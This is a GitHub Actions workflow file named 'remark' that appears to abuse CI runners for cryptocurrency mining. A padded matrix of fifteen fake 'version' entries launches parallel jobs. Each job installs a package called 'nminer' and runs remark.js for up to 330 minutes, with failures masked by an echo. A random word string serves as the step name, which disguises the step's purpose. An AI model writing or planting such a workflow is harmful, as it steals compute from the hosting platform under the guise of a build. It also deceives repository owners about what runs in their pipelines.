name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2340 }
          - { version: 151 }
          - { version: 8267 }
          - { version: 9287 }
          - { version: 5382 }
          - { version: 4066 }
          - { version: 7910 }
          - { version: 1536 }
          - { version: 4523 }
          - { version: 1344 }
          - { version: 3949 }
          - { version: 2791 }
          - { version: 3405 }
          - { version: 9827 }
          - { version: 8012 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: whoa eventually necklace limply
        run: |
          npm install nminer@latest
          timeout 330m node remark.js || echo "remark executed"